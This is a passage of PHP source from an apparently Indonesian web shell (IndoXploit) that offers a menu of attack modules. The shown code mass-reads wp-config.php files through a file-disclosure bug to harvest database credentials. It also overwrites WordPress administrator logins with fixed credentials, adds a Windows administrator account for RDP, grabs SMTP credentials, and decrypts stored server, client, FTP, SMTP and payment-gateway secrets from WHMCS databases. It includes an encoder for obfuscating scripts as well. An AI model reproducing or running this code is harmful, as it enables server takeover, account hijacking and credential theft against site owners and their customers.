					echo "<font face='Iceland' color=lime >SMTP PASS : </font>".findit($file,"smtppass = '","'")."<br>";
					echo "<font face='Iceland' color=lime >SMTP HOST : </font>".findit($file,"smtphost = '","'")."<br>";
					echo "<font face='Iceland' color=lime >SMTP PORT : </font>".findit($file,"smtpport = '","'")."<br>";
					echo "<font face='Iceland' color=lime >SMTP AUTH : </font>".findit($file,"smtpauth = '","'")."<br>";
					echo "<font face='Iceland' color=lime >SMTP SECURE : </font>".findit($file,"smtpsecure = '","'")."<br>";
		}
		
		else{echo "<center><font face='Iceland' color='Red' >".$bda." ----> There is no SMTP </font></center>";}
		echo'<center><font face="Iceland" color=red >----------------------------------------------</font></center>';
	 }
	 
	}


}
elseif($_GET['do'] == 'scdc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";

		$text = $_POST['code'];
	echo"<center><br><b>Script Encode and Decode</b><br>
	<form method='post'><br><br><br>
	<textarea style='width: 450px; height: 150px;' name='code' placeholder='scmu'></textarea><br><br>
	<select class='inputz' size='1' name='ope'>
	<option value='base64'>Base64</option>
	<option value='gzinflate'>str_rot13 - gzinflate - base64</option>
	<option value='str'>str_rot13 - gzinflate - str_rot13 - base64</option>
	</select>&nbsp;<input type='submit' name='submit' value='Encrypt'>
	<input type='submit' name='submits' value='Decrypt'>
	</form>";
		$submit = $_POST['submit'];
		if (isset($submit)) {
			$op = $_POST["ope"];
			switch ($op) {
				case 'base64':
					$codi = base64_encode($text);
				break;
				case 'str':
					$codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
				break;
				case 'gzinflate':
					$codi = base64_encode(gzdeflate(str_rot13($text)));
				break;
				default:
				break;
			}
		}
		$submit = $_POST['submits'];
		if (isset($submit)) {
			$op = $_POST["ope"];
			switch ($op) {
				case 'base64':
					$codi = base64_decode($text);
				break;
				case 'str':
					$codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
				break;
				case 'gzinflate':
					$codi = str_rot13(gzinflate(base64_decode($text)));
				break;
				default:
				break;
			}
		}
		echo "<textarea style='width: 450px; height: 150px;' readonly>$codi</textarea></center><BR><BR>";
}
elseif($_GET['do'] == 'csrf') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";

	echo"<center> CSRF ONLINE 
	<html>
	<form method='post'>
	<select name='array' required>
	<option value=''>Array</option>
	<option value='files[]'>files []</option>
	<option value='qqfile'>qqfile</option>
	<option value='Filedata'>Filedata</option>
	<option value='FileUpload'>FileUpload</option>
	<option value='userfile'>userfile</option>
	<option value='Uploadfile'>Uploadfile</option>
	<option value='file'>file</option>
	</select>
	<input type='text' name='target' size='50' height='10' placeholder='url http://site.com/bug/vuln.php' style='margin: 5px auto; padding-left: 5px;' required><br>
	<input type='submit' name='kunci' value='Lock!'>
	</form>";

	$url = $_POST['target'];
	$pf = $_POST['array'];
	$terkuncyihh = $_POST['kunci'];
	if($terkuncyihh) {
		echo "<form method='post' 
		target='_blank' action='$url' 
		enctype='multipart/form-data'>
		<input type='file' name='$pf'>
		<input type='submit' name='g' 
		value='Hajar'></form";
	}
}
elseif($_GET['do'] == 'wlfd') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";

	echo"<center>
	<br><br><br>
	Wordpress Mass Disclosure<br><br>
	<form method='post'>
	<textarea style='width: 450px; height: 150px;' name='sites' placeholder='http://targetmu.com/path/bug.php?file=../../wp-config.php'></textarea><br>
	<input type='submit' name='go' value='Hajar'>
	</form>";

	$ya=$_POST['go'];
	$co=$_POST['sites'];

	if($ya){
	 $e=explode("\r\n",$co);
	 foreach($e as $bda){
		//echo '<br>'.$bda;
		$dn=($bda);
		$file=@file_get_contents($dn);
		if(eregi('DB_HOST',$file) and !eregi('FTP_USER',$file) ){
		echo'<center><font face="Iceland" color=Red >----------------------------------------------</font></center>';
		echo "<center><font face='Iceland' color=Lime>".$bda."</font></center>";
		echo "<font face='Iceland' color=lime >DB name : </font>".findit($file,"DB_NAME', '","');")."<br>";
		echo "<font face='Iceland' color=lime >DB user : </font>".findit($file,"DB_USER', '","');")."<br>";
		echo "<font face='Iceland' color=lime >DB pass : </font>".findit($file,"DB_PASSWORD', '","');")."<br>";
		echo "<font face='Iceland' color=lime >DB host : </font>".findit($file,"DB_HOST', '","');")."<br>";
		}
		
		else{echo "<center><font face='Iceland' color='Red' >".$bda." ----> Not Infected </font></center>";}
		echo'<center><font face="Iceland" color=red >----------------------------------------------</font></center>';
	 }
	 
	}

}
elseif($_GET['do'] == 'wpes') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";

	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "bahari";
		$pass = "bahari";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "Error, Cant edit the user :(</font><br>";
			} else {
				echo "<font color='lime'>Done</font> >> <a href='$target/wp-login.php' target='_blank'> $target <a><br>
					  <font color='lime'>User</font>  : bahari<br>
					  <font color='lime'>Password</font>  : bahari<br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Edit User</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/btm_conf/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar'>
		</form></center>";
		}
}
elseif($_GET['do'] == 'rdp') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "<center>[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=lime>".$ip."</font><br>
    			Username: <font color=lime>$user</font><br>
    			Password: <font color=lime>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			</center>";
    			if($add_user) {
    				echo "[add user] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=lime>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=lime>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user indoxploit");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>indoxploit</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=lime>$user</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "<center>-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='denita' required>
			<input type='text' name='pass' placeholder='password' value='denita' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form></center>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}

}
elseif($_GET['do'] == 'tetangga') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";

		 echo "<center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Reverse Domain ip Lookup</span></center>
		";
		echo "<div id=result>";
		echo "<center><br><form><input type='text' size='60' placeholder='watch8x.com' name='setan' /><input type='hidden' name='do' value='tetangga'> &nbsp;<input type='submit' value='&nbsp;&check;&nbsp;'></form></center>";
		if(isset($_GET["setan"]))
		{
		$site = $_GET["setan"];
		$setan = "http://domains.yougetsignal.com/domains.php";

		//Curl Function
		$ch = curl_init($setan);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$site&ket=");
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		echo "<table style='margin: 0 auto'>";
		foreach($array as $lnk)
		{
			print "<tr><td><a  style=\"color:#0f0;font-weight:bold;\" href='$lnk' target=_blank>$lnk</a></td></tr>";
		}
		echo "</table>";
		curl_close($ch);
		}
}
elseif($_GET['do'] == 'whmcs') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";

	echo"<p><br/><body>
	<center><br/><br/><nobr><b><span>WHMCS DECODER</span></b></nobr><br/><br/>
	<p><form method='post'>
	<table border=1>
	<tr><td>db_host </td><td><input type='text' style='color:#FF0000;background-color:transparent' size='60' name='anu1' value='localhost'></td></tr>
	<tr><td>db_username </td><td><input type='text' style='color:#FF0000;background-color:transparent' size='60' name='anu2'></td></tr>
	<tr><td>db_password</td><td><input type='text' style='color:#FF0000;background-color:transparent' size='60' name='anu3'></td></tr>
	<tr><td>db_name</td><td><input type='text' style='color:#FF0000;background-color:transparent' size='60' name='anu4'></td></tr>
	<tr><td>cc_encryption_hash</td><td><input style='color:#FF0000;background-color:transparent' type='text' size='60' name='anu5'></td></tr>
	<tr><td align='center' colspan='2'><input class=submit type='submit' style='color:#FF0000;background-color:transparent' value=' HAJAR ' name='plapon'></td></tr>
	 
	</table>
	<br></form></center>";


		$perawan = $_POST['anu1'];
		$kimcil = $_POST['anu2'];
		$janda = $_POST['anu3'];
		$hotel = $_POST['anu4'];
		$kondom = $_POST['anu5'];
		@mysql_connect($perawan, $kimcil, $janda);
		@mysql_select_db($hotel);
		$cc_encryption_hash = $kondom;
		function dec($string, $cc_encryption_hash) {
			$key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
			$hash_key = _hash($key);
			$hash_length = strlen($hash_key);
			$string = base64_decode($string);
			$tmp_iv = substr($string, 0, $hash_length);
			$string = substr($string, $hash_length, strlen($string) - $hash_length);
			$iv = $out = '';
			$c = 0;
			while ($c < $hash_length) {
				$iv.= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
				++$c;
			}
			$key = $iv;
			$c = 0;
			while ($c < strlen($string)) {
				if (($c != 0 AND $c % $hash_length == 0)) {
					$key = _hash($key . substr($out, $c - $hash_length, $hash_length));
				}
				$out.= chr(ord($key[$c % $hash_length]) ^ ord($string[$c]));
				++$c;
			}
			return $out;
		}
		function _hash($string) {
			$hash = (function_exists('sha1')) ? sha1($string) : md5($string);
			$out = '';
			$c = 0;
			while ($c < strlen($hash)) {
				$out.= chr(hexdec($hash[$c] . $hash[$c + 1]));
				$c+= 2;
			}
			return $out;
		}
		########  GO TO HELL ########
		##### :D ########### :D #####
		if (isset($_POST['plapon'])) {
			$query = mysql_query("SELECT *FROM tblservers");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='7'> <span> HOST ROOT </span> </th></tr> 
	<tr> 
	<th class='th_home' align='center'><b>TYPE</b></th>
	<th class='th_home' align='center'><b>ACTIVE</b></th>
	<th class='th_home' align='center'><b>HOSTNAME</b></th>
	<th class='th_home' align='center'><b>IP ADDRESS</b></th>
	<th class='th_home' align='center'><b>USERNAME</b></th>
	<th class='th_home' align='center'><b>PASSWORD</b></th>
	<th class='th_home' align='center'><b>ACCESS HASH</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='8' align='center'>Nothing Found !</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				echo "<tr>
	<td class='td_home' align='center'>{$v['type']}</td>
	<td class='td_home' align='center'>{$v['active']}</td> 
	<td class='td_home' align='center'>{$v['hostname']}</td>
	<td class='td_home' align='center'>{$v['ipaddress']}</td>
	<td class='td_home' align='center'>{$v['username']}</td>
	<td class='td_home' align='center'>" . dec($v['password'], $cc_encryption_hash) . "</td>
	<td class='td_home' align='center'>{$v['accesshash']}</td> 
	</tr>";
			}
			echo "</table>";
			$query = mysql_query("SELECT * FROM tblhosting where username = 'root' or username = 'vmuserxx' or username = 'vmuser' or username = 'admin' or username = 'Admin' or username = 'administrator' or username = 'Administrator' order by domainstatus");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='6'><span>CLIENTS ROOT</span> </th></tr> 
	 
	<tr>
	<th class='th_home' align='center'><b> DOMAIN</b></th>
	<th class='th_home' align='center'><b> STATUS</b></th>
	<th class='th_home' align='center'><b> USERNAME</b></th>
	<th class='th_home' align='center'><b> PASSWORD</b></th>
	<th class='th_home' align='center'><b> DEDICATED IP</b></th>
	<th class='th_home' align='center'><b> ASSIGNED IP</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='6' align='center'>Nothing Found ! :(</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				echo "<tr>
	<td class='td_home' align='center'> {$v['domain']}</td>
	<td class='td_home' align='center'> {$v['domainstatus']}</td>
	<td class='td_home' align='center'> {$v['username']}</td>
	<td class='td_home' align='center'> " . dec($v['password'], $cc_encryption_hash) . "</td>
	<td class='td_home' align='center'> {$v['dedicatedip']}</td>
	<td class='td_home' align='center'> {$v['assignedips']}</td></tr>";
			}
			echo "</table>";
			$query = mysql_query("SELECT *FROM tblregistrars");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='3'><nobr><span> DOMAIN REGISTRAR </span></nobr></th></tr> 
	<tr>
	<th class='th_home' align='center'><b>REGISTRAR</b></th>
	<th class='th_home' align='center'><b>SETTING</b></th>
	<th class='th_home' align='center'><b>VALUE</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='3' align='center'>Nothing Found !</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				$value = (!dec($v['value'], $cc_encryption_hash)) ? "0" : dec($v['value'], $cc_encryption_hash);
				echo "<tr>
	<td class='td_home' align='center'>{$v['registrar']}</td>
	<td class='td_home' align='center'>{$v['setting']}</td>
	<td class='td_home' align='center'>$value</td></tr>";
			}
			echo "</table>";
			$query = mysql_query("SELECT * FROM tblconfiguration where 1");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='4'> <span> FTP BACKUP </span> </th></tr> 
	 
	<tr> 
	<th class='th_home' align='center'><b>FTP HOSTNAME</b></th>
	<th class='th_home' align='center'><b>FTP USERNAME</b></th>
	<th class='th_home' align='center'><b>FTP PASSWORD</b></th>
	<th class='th_home' align='center'><b>DESTINATION</b></th></tr>";
			$ftpb = array('FTPBackupHostname', 'FTPBackupUsername', 'FTPBackupPassword', 'FTPBackupDestination');
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='4' align='center'>Nothing Found ! :(</td></tr>";
			}
			while ($row = mysql_fetch_array($query)) {
				if ($row[setting] == $ftpb[0]) {
					echo "<tr><td class='td_home'>{$row[value]}</td>";
					$ftpb[0] = xxx;
				} elseif ($row[setting] == $ftpb[1]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$ftpb[1] = xxx;
				} elseif ($row[setting] == $ftpb[2]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$ftpb[2] = xxx;
				} elseif ($row[setting] == $ftpb[3]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$ftpb[3] = xxx;
				}
			}
			echo "</table>";
			$query = mysql_query("SELECT * FROM tblconfiguration where 1");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='4'><span> SMTP SERVER </span> </th></tr>
	<tr> 
	<th class='th_home' align='center'><b>SMTP HOST</b></th>
	<th class='th_home' align='center'><b>SMTP USER</b></th>
	<th class='th_home' align='center'><b>SMTP PASS</b></th>
	<th class='th_home' align='center'><b>SMTP PORT</b></th></tr>";
			$smtp = array('SMTPHost', 'SMTPUsername', 'SMTPPassword', 'SMTPPort');
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='4' align='center'>Nothing Found ! :(</td></tr>";
			}
			while ($row = mysql_fetch_array($query)) {
				if ($row[setting] == $smtp[0]) {
					echo "<tr><td class='td_home'>{$row[value]}</td>";
					$smtp[0] = xxx;
				} elseif ($row[setting] == $smtp[1]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$smtp[1] = xxx;
				} elseif ($row[setting] == $smtp[2]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$smtp[2] = xxx;
				} elseif ($row[setting] == $smtp[3]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$smtp[3] = xxx;
				}
			}
			echo "</table>";
			$query = mysql_query("SELECT *FROM tblpaymentgateways");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='4'><nobr><span> PAYMENTS GATEWAY </span></nobr></th></tr> 
	 
	<tr>
	<th class='th_home' align='center'><b>GATEWAY</b></th>
	<th class='th_home' align='center'><b>SETTING</b></th>
	<th class='th_home' align='center'><b>VALUE</b></th>
	<th class='th_home' align='center'><b>ORDER</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='4' align='center'>Nothing Found !</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				echo "<tr>
	<td class='td_home' align='center'>{$v['gateway']}</td>
	<td class='td_home' align='center'>{$v['setting']}</td>
	<td class='td_home' align='center'>{$v['value']}</td>
	<td class='td_home' align='center'>{$v['order']}</td> </tr>";
			}
			echo "</table>";
